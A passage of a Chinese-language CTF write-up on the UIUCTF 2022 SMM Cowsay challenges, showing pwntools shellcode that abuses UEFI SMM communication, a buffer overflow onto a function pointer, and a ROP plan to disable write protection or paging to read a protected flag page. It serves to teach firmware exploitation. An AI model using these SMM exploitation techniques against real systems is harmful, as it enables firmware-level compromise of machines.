class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buffer:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad 8                                /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    .quad 0x44440000                       /* Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">conn.sendline(code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check output to see if things work</span></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
<p>看起来一切都完美了,但实际上这个脚本并不能成功跑通</p>
<p><code>RAX  - 800000000000000F, RCX - 00000000000000B2, RDX - 00000000000000B2</code></p>
<p>返回值RAX是<code>800000000000000F</code>,通过UEFI的状态码表<a target="_blank" rel="noopener" href="https://uefi.org/specs/UEFI/2.10/Apx_D_Status_Codes.html"> Status Codes — UEFI Specification 2.10 documentation</a>,我们可以得知这代表EFI_ACCESS_DENIED</p>
<p>尽管出题人明确添加了 EDK2 补丁以将 SMM 页表 ( <code>0005-PiSmmCpuDxeSmm-Open-up-all-the-page-table-access-res.patch</code> ) 中的所有内存标记为 RWX，但仍然对 SMM 通信执行健全性检查正如我们在 <a target="_blank" rel="noopener" href="https://github.com/tianocore/edk2/blob/7c0ad2c33810ead45b7919f8f8d0e282dae52e71/MdePkg/Library/SmmMemLib/SmmMemLib.c#L163">EDK2 源代码</a>中看到的那样，<strong>不允许communicate()函数的第二个参数缓冲区存在于不受信任或无效的内存区域（如我们的 shellcode 中使用的内存区域）</strong></p>
<p>不过当我们查看上面 <code>Binexec.efi</code> 的代码，在 <code>Cowsay()</code> 函数中， <code>EFI_SMM_COMMUNICATE_HEADER</code> 实际上是使用库函数 <code>AllocateRuntimeZeroPool()</code> 分配的。</p>
<p>这个函数同样存在于<code>BootServices</code>，但可以使用 <code>BootServices-&gt;AllocatePool()</code> 或 <code>BootServices-&gt;AllocatePages()</code> 指定我们要分配的内存“类型”来分配内存。我们想要的 <code>EFI_MEMORY_TYPE</code> 是类型 <code>EfiRuntimeServicesData</code> ，可以从 SMM 访问它。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">EfiRuntimeServicesData = <span class="number">6</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* AllocatePool(EfiRuntimeServicesData, 0x1000, &amp;buffer) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;EfiRuntimeServicesData&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, 0x1000</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;AllocatePool&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buffer:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">conn.sendline(code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">buffer = <span class="built_in">int</span>(conn.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&#x27;Allocated buffer @ 0x%x&#x27;</span>, buffer)</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* Copy data into allocated buffer */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + data]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, 0x20</span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">data:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad 8                                /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    .quad 0x44440000                       /* Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.sendline(code.<span class="built_in">hex</span>().encode())</span><br><span class="line">conn.sendline(<span class="string">b&#x27;done&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>最后还有一个问题</p>
<p><code>IN CONST CHAR16 *Message</code></p>
<p>cowsay函数中调用的信息是UTF-16的,所以flag之会打印一半</p>
<p>不过将data中的0x44440000加上1即可,然后拼接一下</p>
<h2 id="uictf2022-cowsay2"><a href="#uictf2022-cowsay2" class="headerlink" title="uictf2022-cowsay2"></a>uictf2022-cowsay2</h2><p><strong>learn rop</strong></p>
<h3 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h3><p>这个cowsay总共有三题都做一下</p>
<p>题目描述</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">We asked that engineer to fix the issue, but I think he may have left a backdoor disguised as debugging code.</span><br></pre></td></tr></table></figure>
<p>题目环境与之前基本一样,但 <code>SmmCowsay.efi</code> 驱动程序的代码已更改。此外，我们不再拥有全局 RWX 内存，因为第五个 EDK2 补丁 ( <code>0005-PiSmmCpuDxeSmm-Protect-flag-addresses.patch</code> ) 现在不会解锁页表条目权限，而是显式地将包含该标志的内存区域设置为读保护！</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SmmSetMemoryAttributes (</span><br><span class="line">  <span class="number">0x44440000</span>,</span><br><span class="line">  EFI_PAGES_TO_SIZE(<span class="number">1</span>),</span><br><span class="line">  EFI_MEMORY_RP<span class="comment">//read protect</span></span><br><span class="line">  );</span><br></pre></td></tr></table></figure>
<p>这意味着flag不可读了</p>
<p>提交消息中也给出了提示：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">From: YiFei Zhu &lt;zhuyifei@google.com&gt;</span><br><span class="line">Date: Mon, 28 Mar 2022 17:55:14 -0700</span><br><span class="line">Subject: [PATCH 5/8] PiSmmCpuDxeSmm: Protect flag addresses</span><br><span class="line"></span><br><span class="line">So attacker must disable paging or overwrite page table entries</span><br><span class="line">(which would require disabling write protection in cr0... so, the</span><br><span class="line">latter is redundant to former)</span><br></pre></td></tr></table></figure>
<p>EDK2 SMI 处理程序所做的第一件事是设置 4 级页表并启用 64 位长模式，因此 SMM 代码在带有页表的 64 位模式下运行。</p>
<p>页表中存储的虚拟地址与物理地址1:1对应，因此页表本身仅作为管理不同内存区域权限的一种方式（例如，不包含代码的页的页表项将具有NX 位设置）。标志页（ <code>0x44440000</code> ）被标记为“读保护”，这仅意味着相应的页表条目将清除当前位，因此任何访问都将导致页错误。</p>
<p>之前binexec的cowsay数据使用指针传输</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+  Buffer-&gt;HeaderGuid = gEfiSmmCowsayCommunicationGuid;</span><br><span class="line">+  Buffer-&gt;MessageLength = MessageLen;</span><br><span class="line">+  CopyMem(Buffer-&gt;Data, Message, MessageLen);</span><br></pre></td></tr></table></figure>
<p>但现在直接使用数据传输</p>
<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>让我们看看 <code>SmmCowsay.efi</code> 的更新代码。现在通讯情况如何？我们有一个新的 <code>mDebugData</code> 结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  CHAR16 Message[<span class="number">200</span>];</span><br><span class="line">  VOID <span class="title function_">EFIAPI</span> <span class="params">(* <span class="keyword">volatile</span> CowsayFunc)</span><span class="params">(IN CONST CHAR16 *Message, IN UINTN MessageLen)</span>;</span><br><span class="line">  BOOLEAN <span class="keyword">volatile</span> Icebp;</span><br><span class="line">  UINT64 <span class="keyword">volatile</span> Canary;</span><br><span class="line">&#125; mDebugData;</span><br></pre></td></tr></table></figure>
<p>该结构保存一个 <code>-&gt;CowsayFunc</code> 函数指针，该指针在驱动程序初始化时设置：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mDebugData.CowsayFunc = Cowsay;</span><br></pre></td></tr></table></figure>
<p>SMM处理程序代码在接收到消息时使用 <code>mDebugData</code> 结构，如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">EFI_STATUS</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">SmmCowsayHandler</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN EFI_HANDLE  DispatchHandle,</span></span><br><span class="line"><span class="params">  IN CONST VOID  *Context         OPTIONAL,</span></span><br><span class="line"><span class="params">  IN OUT VOID    *CommBuffer      OPTIONAL,</span></span><br><span class="line"><span class="params">  IN OUT UINTN   *CommBufferSize  OPTIONAL</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">&#123;</span><br><span class="line">  EFI_STATUS Status;</span><br><span class="line">  UINTN TempCommBufferSize;</span><br><span class="line">  UINT64 Canary;</span><br><span class="line"></span><br><span class="line">  DEBUG ((DEBUG_INFO, <span class="string">&quot;SmmCowsay SmmCowsayHandler Enter\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!CommBuffer || !CommBufferSize)</span><br><span class="line">    <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line"></span><br><span class="line">  TempCommBufferSize = *CommBufferSize;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ... irrelevant code ...</span></span><br><span class="line"></span><br><span class="line">  Status = SmmCopyMemToSmram(mDebugData.Message, CommBuffer, TempCommBufferSize);</span><br><span class="line">  <span class="keyword">if</span> (EFI_ERROR(Status))</span><br><span class="line">    <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ... irrelevant code ...</span></span><br><span class="line"></span><br><span class="line">  SetMem(mDebugData.Message, <span class="keyword">sizeof</span>(mDebugData.Message), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  mDebugData.CowsayFunc(CommBuffer, TempCommBufferSize);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">  DEBUG ((DEBUG_INFO, <span class="string">&quot;SmmCowsay SmmCowsayHandler Exit\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>问题就出在：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Status = SmmCopyMemToSmram(mDebugData.Message, CommBuffer, TempCommBufferSize);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">mDebugData.CowsayFunc(CommBuffer, TempCommBufferSize);</span><br></pre></td></tr></table></figure>
<p>这里我们有一个类似 memcpy 的函数，使用 <code>-&gt;MessageLength</code> 从 <code>EFI_SMM_COMMUNICATE_HEADER</code> 的 <code>-&gt;Data</code> 字段（作为 <code>CommBuffer</code> 传递）执行复制字段作为大小（作为 <code>CommBufferSize</code> 传递）</p>
<p>那么这里是存在一个溢出的,如果数据大小超过<code>400</code>,那么就会覆盖到<code>CowsayFunc</code>字段</p>
<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>情况看起来很简单：发送 400 字节的垃圾，后跟一个地址，并在系统管理模式内获得 RIP 控制。一旦我们有了 RIP 控制，我们就可以构建一个 ROP 链来完成以下二者中的一个操作</p>
<ul>
<li>(A)完全禁用分页并读取标志</li>
<li>(B)关闭 <code>CR0.WP</code> （因为页表是只读的）并修补页面标志的表条目以使其可读。<a target="_blank" rel="noopener" href="https://www.cnblogs.com/chingliu/archive/2011/08/28/2223804.html">关于cr0寄存器</a></li>
</ul>
<p>方法A是作者的解决方案。事实上，SMM GDT 中已经有一个很好的 32 位保护模式段描述符，我们可以将其用于代码段</p>
<p>但这里选择使用B方法</p>
<p>不过，构建 ROP 链存在一些问题：在 <code>call</code> 到我们的地址之后，我们失去了对执行的控制，因为我们无法控制 SMM 堆栈。简单地用我们的 shellcode 缓冲区的地址覆盖函数指针并在 SMM 中执行任意代码会很好，但正如我们之前所看到的，SMM 无法访问该内存区域，这只会导致崩溃。</p>
<p>qemu启动脚本增加</p>
<p><code>-global isa-debugcon.iobase=0x402 -debugcon file:../../debug.log</code></p>
<p>现在可以运行挑战并查看 <code>debug.log</code> 。在各种调试消息中，EDK2 打印它加载的每个驱动程序的基地址和入口点：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> handout/run; ./run.sh; <span class="built_in">cd</span> -</span><br><span class="line">$ <span class="built_in">cat</span> debug.log | grep <span class="string">&#x27;SMM driver&#x27;</span></span><br><span class="line">Loading SMM driver at 0x00007FE3000 EntryPoint=0x00007FE526B CpuIo2Smm.efi</span><br><span class="line">Loading SMM driver at 0x00007FD9000 EntryPoint=0x00007FDC6E4 SmmLockBox.efi</span><br><span class="line">Loading SMM driver at 0x00007FBF000 EntryPoint=0x00007FCC159 PiSmmCpuDxeSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007F99000 EntryPoint=0x00007F9C851 FvbServicesSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007F83000 EntryPoint=0x00007F8BAD0 VariableSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007EE7000 EntryPoint=0x00007EE99E7 SmmCowsay.efi</span><br><span class="line">Loading SMM driver at 0x00007EDF000 EntryPoint=0x00007EE2684 CpuHotplugSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007EDD000 EntryPoint=0x00007EE2A1E SmmFaultTolerantWriteDxe.efi</span><br></pre></td></tr></table></figure>
<p>毫无疑问，所有这些驱动程序的 <code>.text</code> 部分都将包含我们可以在 SMM 中执行的代码。让我们使用 EDK2 调试日志提供的基地址来使用 <code>ROPGadget</code> 来查找它们：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> handout/edk2_artifacts</span><br><span class="line">ROPgadget --binary CpuIo2Smm.efi  --offset 0x00007FE3000 &gt;&gt; ../../gadgets.txt</span><br><span class="line">ROPgadget --binary SmmLockBox.efi --offset 0x00007FD9000 &gt;&gt; ../../gadgets.txt</span><br><span class="line"><span class="comment"># ... and so on ...</span></span><br></pre></td></tr></table></figure>
<p>尽管我们有gadget，但我们需要多个gadget来构建有用的 ROP 链。在第一个 <code>ret</code> 之后，如果我们不以某种方式将堆栈（RSP）移动到受控内存区域，控制权将返回到 <code>SmmCowsayHandler</code> ，因此我们需要的第一个gadget是能够将堆栈迁移到我们想要的位置的一个。</p>
<p>有这么一个非常好的gadget</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// MdePkg/Library/BaseLib/X64/LongJump.nasm</span></span><br><span class="line">CetDone:</span><br><span class="line"></span><br><span class="line">    mov     rbx, [rcx]</span><br><span class="line">    mov     rsp, [rcx + <span class="number">8</span>]</span><br><span class="line">    mov     rbp, [rcx + <span class="number">0x10</span>]</span><br><span class="line">    mov     rdi, [rcx + <span class="number">0x18</span>]</span><br><span class="line">    mov     rsi, [rcx + <span class="number">0x20</span>]</span><br><span class="line">    mov     r12, [rcx + <span class="number">0x28</span>]</span><br><span class="line">    mov     r13, [rcx + <span class="number">0x30</span>]</span><br><span class="line">    mov     r14, [rcx + <span class="number">0x38</span>]</span><br><span class="line">    mov     r15, [rcx + <span class="number">0x40</span>]</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">    jmp     qword [rcx + <span class="number">0x48</span>]</span><br></pre></td></tr></table></figure>
<p>我们的函数指针将使用 <code>CommBuffer</code> 作为第一个参数 (RCX) 进行调用，因此跳转到此处将直接从我们提供的数据加载一堆寄存器，包括 RSP。</p>
<p>这非常好，确实作者的解决方案使用它可以轻松迁移堆栈并继续 ROP 链，但是 <code>ROPgadget</code> 不够聪明，无法为我们找到这个gadget</p>
<p>所以原作者选用了一种更为复杂的方法</p>
<h4 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h4><p>无论如何，我们仍然有一个不错的技巧。我们确实无法控制 SMM 堆栈，但是如果我们的某些寄存器溢出到堆栈上怎么办？使用 <code>ret 0x123</code> 或 <code>add rsp, 0x123; ret</code> 形式的gadget，我们将能够向前移动堆栈指针并使用我们在 SMM 堆栈上控制的任何内容作为另一个gadget。为了检查这一点，我们可以将调试器附加到 QEMU 并在 <code>SmmCowsayHandler()</code> 中调用 <code>mDebugData.CowsayFunc()</code> 时中断。</p>
<p>我们只需在命令行中添加 <code>-s</code> 即可在 QEMU 中启用调试，然后从 GDB 附加到它。</p>
<p>大佬编写了一个简单的 Python GDB 插件来从 <code>.debug</code> 文件加载调试符号</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AddAllSymbols</span>(gdb.Command):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span> (self):</span><br><span class="line">        <span class="built_in">super</span> (AddAllSymbols, self).__init__ (<span class="string">&#x27;add-all-symbols&#x27;</span>,</span><br><span class="line">            gdb.COMMAND_OBSCURE, gdb.COMPLETE_NONE, <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">invoke</span>(<span class="params">self, args, from_tty</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Adding symbols for all EFI drivers...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;debug.log&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                <span class="keyword">if</span> line.startswith(<span class="string">&#x27;Loading SMM driver at&#x27;</span>):</span><br><span class="line">                    line = line.split()</span><br><span class="line">                    base = line[<span class="number">4</span>]</span><br><span class="line">                <span class="keyword">elif</span> line.startswith(<span class="string">&#x27;Loading driver at&#x27;</span>) <span class="keyword">or</span> line.startswith(<span class="string">&#x27;Loading PEIM at&#x27;</span>):</span><br><span class="line">                    line = line.split()</span><br><span class="line">                    base = line[<span class="number">3</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                path = <span class="string">&#x27;handout/edk2_artifacts/&#x27;</span> + line[-<span class="number">1</span>].replace(<span class="string">&#x27;.efi&#x27;</span>, <span class="string">&#x27;.debug&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> os.path.isfile(path):</span><br><span class="line">                    gdb.execute(<span class="string">&#x27;add-symbol-file &#x27;</span> + path + <span class="string">&#x27; -readnow -o &#x27;</span> + base)</span><br><span class="line"></span><br><span class="line">AddAllSymbols()</span><br></pre></td></tr></table></figure>
<p>漏洞利用的第一部分与 SMM Cowsay 1 相同：获取 <code>BootServices-&gt;AllocatePool</code> 和 <code>-&gt;LocateProtocol</code> ，找到 <code>SmmCommunication</code> 协议，分配一些内存进行写入我们的消息，并通过其 SMI 处理程序将其发送到 <code>SmmCowsay</code> 。唯一改变的是我们发送的内容：这次 <code>EFI_SMM_COMMUNICATE_HEADER</code> 的 <code>-&gt;Data</code> 字段将填充 400 字节的垃圾字符串，再加上 8 个字节以覆盖函数指针。</p>
<p>我们将使用易于识别的值填充所有未使用的通用寄存器，以便我们可以看到堆栈上溢出的内容：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">input</span>(<span class="string">&#x27;Attach GDB now and press [ENTER] to continue...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>.encode(<span class="string">&#x27;utf-16-le&#x27;</span>) * <span class="number">200</span> + p64(<span class="number">0x4141414141414141</span>)</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* Copy data into allocated buffer */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + data]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;<span class="number">0x18</span> + <span class="built_in">len</span>(payload)&#125;</span></span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov ebx, 0x0b0b0b0b</span></span><br><span class="line"><span class="string">    mov esi, 0x01010101</span></span><br><span class="line"><span class="string">    mov edi, 0x02020202</span></span><br><span class="line"><span class="string">    mov ebp, 0x03030303</span></span><br><span class="line"><span class="string">    mov r9 , 0x09090909</span></span><br><span class="line"><span class="string">    mov r10, 0x10101010</span></span><br><span class="line"><span class="string">    mov r11, 0x11111111</span></span><br><span class="line"><span class="string">    mov r12, 0x12121212</span></span><br><span class="line"><span class="string">    mov r13, 0x13131313</span></span><br><span class="line"><span class="string">    mov r14, 0x14141414</span></span><br><span class="line"><span class="string">    mov r15, 0x15151515</span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">data:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>                   /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    /* payload will be appended here to serve as Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.sendline(code.<span class="built_in">hex</span>().encode() + payload.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line">conn.interactive() <span class="comment"># Let&#x27;s see what happens</span></span><br></pre></td></tr></table></figure>
